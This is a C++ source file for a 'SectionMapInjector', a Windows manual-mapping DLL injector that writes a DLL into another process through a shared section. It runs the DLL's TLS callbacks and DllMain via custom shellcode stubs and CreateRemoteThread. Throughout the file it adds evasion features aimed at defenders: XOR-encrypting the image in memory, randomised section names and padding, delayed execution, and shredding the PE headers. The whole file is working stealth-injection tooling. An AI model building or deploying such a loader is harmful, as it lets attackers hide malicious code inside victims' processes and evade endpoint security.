// SectionMapInjector.cpp - Section-based (fileless) DLL mapping
#include "../include/SectionMapInjector.h"

#include <winternl.h>
#include <cstring>
#include <fstream>
#include <optional>
#include <random>
#include <array>
#include <algorithm>
#include <utility>
#include <Rpc.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Rpcrt4.lib")

namespace injection {

namespace {

constexpr SIZE_T kPageSize = 0x1000;
constexpr SIZE_T kMaxEntropyPadding = 0x20000; // 128 KB
constexpr ULONG kViewUnmap = 2;

typedef NTSTATUS (NTAPI *NtCreateSection_t)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS (NTAPI *NtMapViewOfSection_t)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

NtCreateSection_t pNtCreateSection = nullptr;
NtMapViewOfSection_t pNtMapViewOfSection = nullptr;

SIZE_T AlignUp(SIZE_T value, SIZE_T alignment = kPageSize) {
    return (value + alignment - 1) & ~(alignment - 1);
}

SIZE_T RandomAlignedSize(SIZE_T limit) {
    if (limit == 0) {
        return 0;
    }
    static thread_local std::mt19937_64 rng{std::random_device{}()};
    std::uniform_int_distribution<SIZE_T> dist(0, limit / kPageSize);
    return dist(rng) * kPageSize;
}

DWORD RandomXorKey() {
    static thread_local std::mt19937 rng{std::random_device{}()};
    std::uniform_int_distribution<DWORD> dist(1, 0xFFFFFFFFu);
    return dist(rng) | 0x01010101u; // avoid zero bytes
}

std::wstring GenerateSectionObjectName() {
    GUID guid{};
    if (UuidCreate(&guid) != RPC_S_OK) {
        return L"";
    }
    RPC_WSTR rpcStr = nullptr;
    if (UuidToStringW(&guid, &rpcStr) != RPC_S_OK) {
        return L"";
    }
    std::wstring name = L"\\BaseNamedObjects\\";
    name.append(reinterpret_cast<const wchar_t*>(rpcStr));
    RpcStringFreeW(&rpcStr);
    return name;
}

std::wstring FormatSystemError(DWORD error) {
    if (error == 0) return L"";
    wchar_t buf[512] = {};
    DWORD len = FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                               nullptr, error,
                               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                               buf, static_cast<DWORD>(std::size(buf)), nullptr);
    if (!len) return L"Unknown error (" + std::to_wstring(error) + L")";
    std::wstring s(buf, buf + len);
    while (!s.empty() && (s.back() == L'\r' || s.back() == L'\n')) s.pop_back();
    return s;
}

bool LoadNtdll() {
    if (pNtCreateSection && pNtMapViewOfSection) return true;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;
    pNtCreateSection = reinterpret_cast<NtCreateSection_t>(GetProcAddress(ntdll, "NtCreateSection"));
    pNtMapViewOfSection = reinterpret_cast<NtMapViewOfSection_t>(GetProcAddress(ntdll, "NtMapViewOfSection"));
    return pNtCreateSection && pNtMapViewOfSection;
}

} // namespace

SectionMapInjector::SectionMapInjector()
    : config_{} {}

bool SectionMapInjector::LoadFromFile(const std::wstring& dllPath) {
    dllBuffer_.clear();
    dosHeader_ = nullptr;
    ntHeaders_ = nullptr;
    lastError_.clear();

    std::ifstream file(dllPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        SetLastErrorMessage(L"Failed to open DLL from path: " + dllPath);
        return false;
    }
    const std::streamoff size = file.tellg();
    if (size <= 0) {
        SetLastErrorMessage(L"DLL file is empty: " + dllPath);
        return false;
    }
    file.seekg(0, std::ios::beg);
    dllBuffer_.resize(static_cast<size_t>(size));
    if (!file.read(reinterpret_cast<char*>(dllBuffer_.data()), size)) {
        SetLastErrorMessage(L"Failed to read DLL content: " + dllPath);
        dllBuffer_.clear();
        return false;
    }
    return ValidatePE();
}

bool SectionMapInjector::LoadFromMemory(const BYTE* buffer, size_t size) {
    if (!buffer || size == 0) {
        SetLastErrorMessage(L"Invalid buffer supplied to LoadFromMemory.");
        return false;
    }
    dllBuffer_.assign(buffer, buffer + size);
    dosHeader_ = nullptr;
    ntHeaders_ = nullptr;
    lastError_.clear();
    return ValidatePE();
}

size_t SectionMapInjector::ImageSize() const noexcept {
    if (!ntHeaders_) return 0;
    return ntHeaders_->OptionalHeader.SizeOfImage;
}

bool SectionMapInjector::ValidatePE() {
    if (dllBuffer_.size() < sizeof(IMAGE_DOS_HEADER)) {
        SetLastErrorMessage(L"Buffer too small for IMAGE_DOS_HEADER.");
        return false;
    }
    dosHeader_ = reinterpret_cast<PIMAGE_DOS_HEADER>(dllBuffer_.data());
    if (dosHeader_->e_magic != IMAGE_DOS_SIGNATURE) {
        SetLastErrorMessage(L"Invalid DOS signature in DLL buffer.");
        return false;
    }
    if (dllBuffer_.size() < static_cast<size_t>(dosHeader_->e_lfanew) + sizeof(IMAGE_NT_HEADERS)) {
        SetLastErrorMessage(L"Buffer too small for IMAGE_NT_HEADERS.");
        return false;
    }
    ntHeaders_ = reinterpret_cast<PIMAGE_NT_HEADERS>(dllBuffer_.data() + dosHeader_->e_lfanew);
    if (ntHeaders_->Signature != IMAGE_NT_SIGNATURE) {
        SetLastErrorMessage(L"Invalid NT signature in DLL buffer.");
        return false;
    }
#ifdef _WIN64
    if (ntHeaders_->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        SetLastErrorMessage(L"Architecture mismatch: expected x64 image.");
        return false;
    }
#else
    if (ntHeaders_->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
        SetLastErrorMessage(L"Architecture mismatch: expected x86 image.");
        return false;
    }
#endif
    return true;
}

bool SectionMapInjector::CreateSectionAndViews(HANDLE process, DWORD flags, HANDLE& outSection, LPVOID& outLocal, LPVOID& outRemote) {
    if (!LoadNtdll()) {
        SetLastErrorMessage(L"Failed to resolve NtCreateSection/NtMapViewOfSection.");
        return false;
    }

    std::wstring sectionName;
    UNICODE_STRING unicodeName{};
    OBJECT_ATTRIBUTES objectAttributes{};
    POBJECT_ATTRIBUTES attributes = nullptr;

    if (config_.randomSectionName) {
        sectionName = GenerateSectionObjectName();
        if (!sectionName.empty()) {
            unicodeName.Buffer = const_cast<PWCH>(sectionName.c_str());
            unicodeName.Length = static_cast<USHORT>(sectionName.size() * sizeof(wchar_t));
            unicodeName.MaximumLength = unicodeName.Length;
            InitializeObjectAttributes(&objectAttributes, &unicodeName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
            attributes = &objectAttributes;
        }
    }

    LARGE_INTEGER maxSize{};
    maxSize.QuadPart = ntHeaders_->OptionalHeader.SizeOfImage;
    if (config_.entropyPadding) {
        maxSize.QuadPart += RandomAlignedSize(kMaxEntropyPadding);
    }

    HANDLE section = nullptr;
    NTSTATUS status = pNtCreateSection(&section,
                                       SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
                                       attributes,
                                       &maxSize,
                                       PAGE_EXECUTE_READWRITE,
                                       SEC_COMMIT,
                                       nullptr);
    if (status != 0) {
        SetLastErrorMessage(L"NtCreateSection failed: 0x" + std::to_wstring(static_cast<ULONG>(status)));
        return false;
    }

    SIZE_T viewSize = 0; // map entire
    PVOID localBase = nullptr;
    status = pNtMapViewOfSection(section, GetCurrentProcess(), &localBase, 0, 0, nullptr, &viewSize,
                                 kViewUnmap, 0,
                                 PAGE_READWRITE);
    if (status != 0 || !localBase) {
        SetLastErrorMessage(L"NtMapViewOfSection (local) failed: 0x" + std::to_wstring(status));
        CloseHandle(section);
        return false;
    }

    viewSize = 0;
    PVOID remoteBase = nullptr;
    const ULONG remoteProt = (flags & kSectionMapRWXDebug) ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
    status = pNtMapViewOfSection(section, process, &remoteBase, 0, 0, nullptr, &viewSize,
                                 kViewUnmap, 0, remoteProt);
    if (status != 0 || !remoteBase) {
        SetLastErrorMessage(L"NtMapViewOfSection (remote) failed: 0x" + std::to_wstring(status));
        // unmap local view
        UnmapViewOfFile(localBase);
        CloseHandle(section);
        return false;
    }

    outSection = section;
    outLocal = localBase;
    outRemote = remoteBase;
    return true;
}

bool SectionMapInjector::PopulateImage(LPVOID localView, LPVOID /*remoteView*/) {
    if (!localView) {
        SetLastErrorMessage(L"PopulateImage received null local view");
        return false;
    }

    const size_t headersSize = ntHeaders_->OptionalHeader.SizeOfHeaders;
    if (dllBuffer_.size() < headersSize) {
        SetLastErrorMessage(L"DLL buffer too small for headers copy");
        return false;
    }

    memcpy(localView, dllBuffer_.data(), headersSize);

    const size_t imageSize = ntHeaders_->OptionalHeader.SizeOfImage;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHeaders_);
    for (WORD i = 0; i < ntHeaders_->FileHeader.NumberOfSections; ++i) {
        if (sec[i].SizeOfRawData == 0) {
            continue;
        }

        const size_t rawSize = sec[i].SizeOfRawData;
        const size_t srcOffset = sec[i].PointerToRawData;
        const size_t destOffset = sec[i].VirtualAddress;

        if (srcOffset + rawSize > dllBuffer_.size()) {
            SetLastErrorMessage(L"Section raw data exceeds DLL buffer bounds");
            return false;
        }

        if (destOffset + rawSize > imageSize) {
            SetLastErrorMessage(L"Section virtual address exceeds mapped image size");
            return false;
        }

        BYTE* dest = static_cast<BYTE*>(localView) + destOffset;
        const BYTE* src = dllBuffer_.data() + srcOffset;
        memcpy(dest, src, rawSize);
    }
    return true;
}

bool SectionMapInjector::ApplyRelocations(LPVOID localView, LPVOID remoteView) {
    ULONGLONG delta =
#ifdef _WIN64
        reinterpret_cast<ULONGLONG>(remoteView) - ntHeaders_->OptionalHeader.ImageBase;
#else
        static_cast<ULONGLONG>(reinterpret_cast<DWORD>(remoteView) - ntHeaders_->OptionalHeader.ImageBase);
#endif
    if (delta == 0) return true;
    auto& dir = ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (dir.Size == 0) return true;
    auto reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(dllBuffer_.data() + dir.VirtualAddress);
    while (reloc && reloc->VirtualAddress && reloc->SizeOfBlock) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        auto entry = reinterpret_cast<PWORD>(reinterpret_cast<BYTE*>(reloc) + sizeof(IMAGE_BASE_RELOCATION));
        for (DWORD i = 0; i < count; ++i) {
            WORD typeOffset = entry[i];
            WORD type = typeOffset >> 12;
            WORD off = typeOffset & 0x0FFF;
            if (type == IMAGE_REL_BASED_ABSOLUTE) continue;
#ifdef _WIN64
            if (type == IMAGE_REL_BASED_DIR64) {
                auto patch = reinterpret_cast<ULONGLONG*>(static_cast<BYTE*>(localView) + reloc->VirtualAddress + off);
                *patch += delta;
            }
#else
            if (type == IMAGE_REL_BASED_HIGHLOW) {
                auto patch = reinterpret_cast<DWORD*>(static_cast<BYTE*>(localView) + reloc->VirtualAddress + off);
                *patch += static_cast<DWORD>(delta);
            }
#endif
        }
        reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<PBYTE>(reloc) + reloc->SizeOfBlock);
    }
    return true;
}

bool SectionMapInjector::ResolveImports(LPVOID localView, LPVOID /*remoteView*/) {
    auto& dir = ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (dir.Size == 0) return true;
    auto importDesc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(dllBuffer_.data() + dir.VirtualAddress);
    while (importDesc && importDesc->Name) {
        const char* modName = reinterpret_cast<const char*>(dllBuffer_.data() + importDesc->Name);
        HMODULE mod = LoadLibraryA(modName);
        if (!mod) {
            SetLastErrorMessage(L"Failed to load import module: " + std::wstring(modName, modName + strlen(modName)));
            return false;
        }
        auto thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(dllBuffer_.data() +
                        (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));
        auto iat = reinterpret_cast<PIMAGE_THUNK_DATA>(static_cast<BYTE*>(localView) + importDesc->FirstThunk);
        while (thunk && thunk->u1.AddressOfData) {
            FARPROC proc = nullptr;
            if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                proc = GetProcAddress(mod, reinterpret_cast<LPCSTR>(IMAGE_ORDINAL(thunk->u1.Ordinal)));
            } else {
                auto byName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(dllBuffer_.data() + thunk->u1.AddressOfData);
                proc = GetProcAddress(mod, reinterpret_cast<LPCSTR>(byName->Name));
            }
            if (!proc) {
                SetLastErrorMessage(L"Failed to resolve import from module: " + std::wstring(modName, modName + strlen(modName)));
                return false;
            }
#ifdef _WIN64
            iat->u1.Function = reinterpret_cast<ULONGLONG>(proc);
#else
            iat->u1.Function = reinterpret_cast<DWORD>(proc);
#endif
            ++thunk; ++iat;
        }
        ++importDesc;
    }
    return true;
}

bool SectionMapInjector::ProtectSections(HANDLE process, LPVOID remoteView, DWORD flags) {
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHeaders_);
    for (WORD i = 0; i < ntHeaders_->FileHeader.NumberOfSections; ++i) {
        const bool exec = (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        const bool write = (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
        const bool read = (sec[i].Characteristics & IMAGE_SCN_MEM_READ) != 0;
        DWORD protect = PAGE_NOACCESS;
        if (exec) protect = read ? (write ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ) : PAGE_EXECUTE;
        else if (read) protect = write ? PAGE_READWRITE : PAGE_READONLY;
        if (!(flags & kSectionMapRWXDebug)) {
            DWORD old = 0;
            VirtualProtectEx(process,
                             static_cast<BYTE*>(remoteView) + sec[i].VirtualAddress,
                             sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData,
                             protect, &old);
        }
    }
    return true;
}

bool SectionMapInjector::ExecuteTLS(HANDLE process, LPVOID remoteView, DWORD flags) {
    if (flags & kSectionMapNoTLS) return true;
    auto& dir = ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (dir.Size == 0) return true;
    auto tlsDir = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(dllBuffer_.data() + dir.VirtualAddress);
    if (!tlsDir->AddressOfCallBacks) return true;
    auto callbacks = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(tlsDir->AddressOfCallBacks);
    while (*callbacks) {
        HANDLE thread = CreateRemoteThread(process, nullptr, 0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(*callbacks), remoteView, 0, nullptr);
        if (thread) { WaitForSingleObject(thread, 2000); CloseHandle(thread); }
        ++callbacks;
    }
    return true;
}

void SectionMapInjector::NeutralizeTlsLocal(LPVOID localView) {
    if (!localView) {
        return;
    }
    auto& dir = ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (dir.Size == 0 || dir.VirtualAddress == 0) {
        return;
    }
#if defined(_WIN64)
    auto tlsDir = reinterpret_cast<PIMAGE_TLS_DIRECTORY64>(static_cast<BYTE*>(localView) + dir.VirtualAddress);
#else
    auto tlsDir = reinterpret_cast<PIMAGE_TLS_DIRECTORY32>(static_cast<BYTE*>(localView) + dir.VirtualAddress);
#endif
    if (!tlsDir) {
        return;
    }
    tlsDir->StartAddressOfRawData = 0;
    tlsDir->EndAddressOfRawData = 0;
    tlsDir->AddressOfIndex = 0;
    tlsDir->AddressOfCallBacks = 0;
    tlsDir->SizeOfZeroFill = 0;
}

bool SectionMapInjector::CallRemoteDllMain(HANDLE process, LPVOID remoteView, DWORD reason) {
    if (ntHeaders_->OptionalHeader.AddressOfEntryPoint == 0) return true;
    LPVOID entry = static_cast<BYTE*>(remoteView) + ntHeaders_->OptionalHeader.AddressOfEntryPoint;
#ifdef _WIN64
    BYTE stub[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB9, 0,0,0,0,0,0,0,0, // RCX = base
        0xBA, 0,0,0,0,               // EDX = reason
        0x49, 0xB8, 0,0,0,0,0,0,0,0, // R8 = reserved (0)
        0x48, 0xB8, 0,0,0,0,0,0,0,0, // RAX = entry
        0xFF, 0xD0,                 // call rax
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *reinterpret_cast<ULONGLONG*>(&stub[6]) = reinterpret_cast<ULONGLONG>(remoteView);
    *reinterpret_cast<DWORD*>(&stub[15]) = reason;
    *reinterpret_cast<ULONGLONG*>(&stub[21]) = 0;
    *reinterpret_cast<ULONGLONG*>(&stub[31]) = reinterpret_cast<ULONGLONG>(entry);
#else
    BYTE stub[] = {
        0x68, 0,0,0,0,  // push 0
        0x68, 0,0,0,0,  // push reason
        0x68, 0,0,0,0,  // push base
        0xB8, 0,0,0,0,  // mov eax, entry
        0xFF, 0xD0,     // call eax
        0xC3
    };
    *reinterpret_cast<DWORD*>(&stub[1]) = 0;
    *reinterpret_cast<DWORD*>(&stub[6]) = reason;
    *reinterpret_cast<DWORD*>(&stub[11]) = reinterpret_cast<DWORD>(remoteView);
    *reinterpret_cast<DWORD*>(&stub[16]) = reinterpret_cast<DWORD>(entry);
#endif
    LPVOID remoteStub = VirtualAllocEx(process, nullptr, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteStub) { SetLastErrorFromWin32(L"VirtualAllocEx (stub)"); return false; }
    SIZE_T w = 0; if (!WriteProcessMemory(process, remoteStub, stub, sizeof(stub), &w) || w != sizeof(stub)) {
        SetLastErrorFromWin32(L"WriteProcessMemory (stub)");
        VirtualFreeEx(process, remoteStub, 0, MEM_RELEASE); return false;
    }
    HANDLE th = CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteStub), nullptr, 0, nullptr);
    if (!th) { SetLastErrorFromWin32(L"CreateRemoteThread (stub)"); VirtualFreeEx(process, remoteStub, 0, MEM_RELEASE); return false; }
    WaitForSingleObject(th, INFINITE); CloseHandle(th); VirtualFreeEx(process, remoteStub, 0, MEM_RELEASE); return true;
}

bool SectionMapInjector::QueueDeferredDllMain(HANDLE process, LPVOID remoteView, DWORD reason) {
    if (ntHeaders_->OptionalHeader.AddressOfEntryPoint == 0) return true;
    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32) {
        SetLastErrorMessage(L"Failed to locate kernel32.dll");
        return false;
    }
    FARPROC sleepProc = GetProcAddress(kernel32, "Sleep");
    if (!sleepProc) {
        SetLastErrorMessage(L"Failed to resolve Sleep");
        return false;
    }
    static thread_local std::mt19937 rng{std::random_device{}()};
    std::uniform_int_distribution<DWORD> delayDist(250, 1250);
    DWORD delayMs = delayDist(rng);

    LPVOID entry = static_cast<BYTE*>(remoteView) + ntHeaders_->OptionalHeader.AddressOfEntryPoint;
#ifdef _WIN64
    BYTE stub[] = {
        0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
        0xB9, 0,0,0,0,                      // mov ecx, delay
        0x48, 0xB8, 0,0,0,0,0,0,0,0,        // mov rax, Sleep
        0xFF, 0xD0,                         // call rax
        0x48, 0xB9, 0,0,0,0,0,0,0,0,        // mov rcx, module base
        0xBA, 0,0,0,0,                      // mov edx, reason
        0x49, 0xB8, 0,0,0,0,0,0,0,0,        // mov r8, 0
        0x48, 0xB8, 0,0,0,0,0,0,0,0,        // mov rax, entry
        0xFF, 0xD0,                         // call rax
        0x48, 0x83, 0xC4, 0x28,             // add rsp, 0x28
        0xC3                                // ret
    };
    *reinterpret_cast<DWORD*>(&stub[4]) = delayMs;
    *reinterpret_cast<ULONGLONG*>(&stub[8]) = reinterpret_cast<ULONGLONG>(sleepProc);
    *reinterpret_cast<ULONGLONG*>(&stub[20]) = reinterpret_cast<ULONGLONG>(remoteView);
    *reinterpret_cast<DWORD*>(&stub[30]) = reason;
    *reinterpret_cast<ULONGLONG*>(&stub[36]) = 0;
    *reinterpret_cast<ULONGLONG*>(&stub[46]) = reinterpret_cast<ULONGLONG>(entry);
#else
    BYTE stub[] = {
        0x68, 0,0,0,0,            // push delay
        0xB8, 0,0,0,0,            // mov eax, Sleep
        0xFF, 0xD0,               // call eax
        0x83, 0xC4, 0x04,         // add esp, 4
        0x68, 0,0,0,0,            // push 0
        0x68, 0,0,0,0,            // push reason
        0x68, 0,0,0,0,            // push module base
        0xB8, 0,0,0,0,            // mov eax, entry
        0xFF, 0xD0,               // call eax
        0xC3                      // ret
    };
    *reinterpret_cast<DWORD*>(&stub[1]) = delayMs;
    *reinterpret_cast<DWORD*>(&stub[6]) = reinterpret_cast<DWORD>(sleepProc);
    *reinterpret_cast<DWORD*>(&stub[17]) = 0;
    *reinterpret_cast<DWORD*>(&stub[22]) = reason;
    *reinterpret_cast<DWORD*>(&stub[27]) = reinterpret_cast<DWORD>(remoteView);
    *reinterpret_cast<DWORD*>(&stub[32]) = reinterpret_cast<DWORD>(entry);
#endif

    LPVOID remoteStub = VirtualAllocEx(process, nullptr, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteStub) {
        SetLastErrorFromWin32(L"VirtualAllocEx (deferred stub)");
        return false;
    }
    SIZE_T written = 0;
    if (!WriteProcessMemory(process, remoteStub, stub, sizeof(stub), &written) || written != sizeof(stub)) {
        SetLastErrorFromWin32(L"WriteProcessMemory (deferred stub)");
        VirtualFreeEx(process, remoteStub, 0, MEM_RELEASE);
        return false;
    }

    HANDLE thread = CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteStub), nullptr, 0, nullptr);
    if (!thread) {
        SetLastErrorFromWin32(L"CreateRemoteThread (deferred stub)");
        VirtualFreeEx(process, remoteStub, 0, MEM_RELEASE);
        return false;
    }
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    VirtualFreeEx(process, remoteStub, 0, MEM_RELEASE);
    return true;
}

void SectionMapInjector::CollectEncryptionSlices(std::vector<std::pair<DWORD, DWORD>>& slices) const {
    slices.clear();
    if (!ntHeaders_) {
        return;
    }
    DWORD headerSize = ntHeaders_->OptionalHeader.SizeOfHeaders;
    if (headerSize) {
        slices.emplace_back(0u, headerSize);
    }
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHeaders_);
    for (WORD i = 0; i < ntHeaders_->FileHeader.NumberOfSections; ++i) {
        DWORD size = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        if (size == 0) {
            continue;
        }
        slices.emplace_back(sec[i].VirtualAddress, size);
    }
}

DWORD SectionMapInjector::GenerateXorKey() {
    return RandomXorKey();
}

void SectionMapInjector::ApplyXorLocal(LPVOID localView,
                                       const std::vector<std::pair<DWORD, DWORD>>& slices,
                                       DWORD key) {
    if (!localView || slices.empty()) {
        return;
    }
    std::array<BYTE, 4> keyBytes{
        static_cast<BYTE>(key & 0xFF),
        static_cast<BYTE>((key >> 8) & 0xFF),
        static_cast<BYTE>((key >> 16) & 0xFF),
        static_cast<BYTE>((key >> 24) & 0xFF)
    };
    for (const auto& slice : slices) {
        BYTE* base = static_cast<BYTE*>(localView) + slice.first;
        for (DWORD i = 0; i < slice.second; ++i) {
            base[i] ^= keyBytes[i & 3];
        }
    }
}

bool SectionMapInjector::ApplyXorRemote(HANDLE process,
                                        LPVOID remoteView,
                                        const std::vector<std::pair<DWORD, DWORD>>& slices,
                                        DWORD key) {
    if (!remoteView || !process || slices.empty()) {
        return true;
    }
    std::array<BYTE, 4> keyBytes{
        static_cast<BYTE>(key & 0xFF),
        static_cast<BYTE>((key >> 8) & 0xFF),
        static_cast<BYTE>((key >> 16) & 0xFF),
        static_cast<BYTE>((key >> 24) & 0xFF)
    };

    std::vector<BYTE> buffer(0x1000);

    for (const auto& slice : slices) {
        BYTE* base = static_cast<BYTE*>(remoteView) + slice.first;
        SIZE_T regionSize = AlignUp(slice.second);
        DWORD oldProtect = 0;
        VirtualProtectEx(process, base, regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);

        SIZE_T processed = 0;
        DWORD restoreProtect = 0;
        while (processed < slice.second) {
            SIZE_T chunk = std::min<SIZE_T>(buffer.size(), slice.second - processed);
            SIZE_T bytesRead = 0;
            if (!ReadProcessMemory(process, base + processed, buffer.data(), chunk, &bytesRead) || bytesRead != chunk) {
                SetLastErrorFromWin32(L"ReadProcessMemory (encryption pass)");
                if (oldProtect != 0) {
                    VirtualProtectEx(process, base, regionSize, oldProtect, &restoreProtect);
                }
                return false;
            }
            for (SIZE_T i = 0; i < chunk; ++i) {
                buffer[i] ^= keyBytes[(processed + i) & 3];
            }
            SIZE_T bytesWritten = 0;
            if (!WriteProcessMemory(process, base + processed, buffer.data(), chunk, &bytesWritten) || bytesWritten != chunk) {
                SetLastErrorFromWin32(L"WriteProcessMemory (encryption pass)");
                if (oldProtect != 0) {
                    VirtualProtectEx(process, base, regionSize, oldProtect, &restoreProtect);
                }
                return false;
            }
            processed += chunk;
        }

        DWORD tmpProtect = 0;
        if (oldProtect != 0) {
            VirtualProtectEx(process, base, regionSize, oldProtect, &tmpProtect);
        }
    }
    return true;
}

void SectionMapInjector::RandomizeHeadersRemote(HANDLE process, LPVOID remoteView) {
    if (!remoteView) {
        return;
    }
    DWORD headerSize = ntHeaders_->OptionalHeader.SizeOfHeaders;
    if (headerSize == 0) {
        return;
    }
    SIZE_T aligned = AlignUp(headerSize);
    std::vector<BYTE> shred(aligned);
    static thread_local std::mt19937 rng{std::random_device{}()};
    std::uniform_int_distribution<int> byteDist(0, 255);
    for (auto& b : shred) {
        b = static_cast<BYTE>(byteDist(rng));
    }

    SIZE_T written = 0;
    WriteProcessMemory(process, remoteView, shred.data(), headerSize, &written);

    DWORD oldProtect = 0;
    VirtualProtectEx(process, remoteView, aligned, PAGE_NOACCESS, &oldProtect);
}

void SectionMapInjector::EraseHeadersRemote(HANDLE process, LPVOID remoteView) {
    RandomizeHeadersRemote(process, remoteView);
}

bool SectionMapInjector::InjectIntoProcess(DWORD processId, DWORD flags) {
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!process) { SetLastErrorFromWin32(L"OpenProcess"); return false; }
    bool ok = InjectIntoProcess(process, flags);
    CloseHandle(process); return ok;
}

bool SectionMapInjector::InjectIntoProcess(HANDLE processHandle, DWORD flags) {
    if (!processHandle) { SetLastErrorMessage(L"InjectIntoProcess received null process handle."); return false; }
    if (!ntHeaders_) { SetLastErrorMessage(L"SectionMapInjector not initialised with a valid image."); return false; }

    HANDLE section = nullptr; LPVOID localView = nullptr; LPVOID remoteView = nullptr;
    if (!CreateSectionAndViews(processHandle, flags, section, localView, remoteView)) return false;

    bool success = true;
    std::vector<std::pair<DWORD, DWORD>> slices;
    DWORD xorKey = 0;
    bool encrypted = false;
    bool decrypted = false;
    bool localUnmapped = false;

    if (success) success = PopulateImage(localView, remoteView);
    if (success) success = ApplyRelocations(localView, remoteView);
    if (success) success = ResolveImports(localView, remoteView);

    if (success && config_.neutralizeTls) {
        NeutralizeTlsLocal(localView);
    }

    if (success && config_.encryptSections) {
        CollectEncryptionSlices(slices);
        xorKey = GenerateXorKey();
        ApplyXorLocal(localView, slices, xorKey);
        encrypted = true;
    }

    if (success) success = ProtectSections(processHandle, remoteView, flags);

    if (success && config_.unmapLocalViewEarly && localView) {
        UnmapViewOfFile(localView);
        localView = nullptr;
        localUnmapped = true;
    }

    if (success && encrypted) {
        decrypted = ApplyXorRemote(processHandle, remoteView, slices, xorKey); // decrypt prior to TLS/entry
        success = success && decrypted;
    }

    if (success) {
        if (!config_.neutralizeTls && !(flags & kSectionMapNoTLS)) {
            success = ExecuteTLS(processHandle, remoteView, flags);
        }
    }

    if (success) {
        if (config_.deferEntryPoint) {
            success = QueueDeferredDllMain(processHandle, remoteView, DLL_PROCESS_ATTACH);
        } else {
            success = CallRemoteDllMain(processHandle, remoteView, DLL_PROCESS_ATTACH);
        }
    }

    if (success && (config_.shredHeaders || (flags & kSectionMapEraseHeaders))) {
        RandomizeHeadersRemote(processHandle, remoteView);
    } else if ((flags & kSectionMapEraseHeaders)) {
        EraseHeadersRemote(processHandle, remoteView);
    }

    if (config_.reencryptAfterInit && encrypted && decrypted) {
        ApplyXorRemote(processHandle, remoteView, slices, xorKey); // re-encrypt (best-effort)
    }

    if (localView && !localUnmapped) {
        UnmapViewOfFile(localView);
    }
    CloseHandle(section);
    return success;
}

void SectionMapInjector::SetLastErrorMessage(const std::wstring& message) { lastError_ = message; }
void SectionMapInjector::SetLastErrorFromWin32(const wchar_t* context) {
    const DWORD e = ::GetLastError();
    if (context && *context) {
        lastError_ = std::wstring(context) + L": " + FormatSystemError(e);
    } else {
        lastError_ = FormatSystemError(e);
    }
}

} // namespace injection
